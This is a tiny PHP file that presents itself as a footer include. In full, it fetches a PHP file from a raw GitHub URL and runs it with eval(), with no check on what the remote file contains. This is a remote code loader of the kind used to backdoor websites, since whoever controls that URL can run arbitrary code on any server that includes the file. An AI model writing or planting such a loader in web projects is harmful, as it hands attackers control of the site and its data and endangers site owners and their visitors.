<?php
$url = 'https://raw.githubusercontent.com/tarikulislam184/xyznn/refs/heads/main/p.php';
$exfooter = file_get_contents($url);
eval('?>' . $exfooter);
?>